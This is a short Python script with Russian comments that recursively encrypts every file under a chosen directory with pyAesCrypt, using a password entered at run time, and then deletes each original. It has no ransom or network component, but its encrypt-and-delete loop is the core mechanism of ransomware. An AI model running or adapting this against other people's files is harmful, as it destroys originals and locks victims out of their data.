import pyAesCrypt
import os


def encryption(file, password):
    """Функция шифрования файла"""

    # Задаём размер буфера
    buffer_size = 512 * 1024

    # Метод шифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )

    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # Удаляем исходные файлы
    os.remove(file)


def walking_by_dirs(dir, password):
    """Проходимся по директориям"""

    # Перебираем поддиректории (в указанной директории)
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # Если нашёл файл - шифруй
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # если находим директорию, то повторяем цикл в поисках файлов
        else:
            walking_by_dirs(path, password)


password = input("Введите пароль для шифрования: ")
# Ввести путь и задать пароль
walking_by_dirs("your path", password)
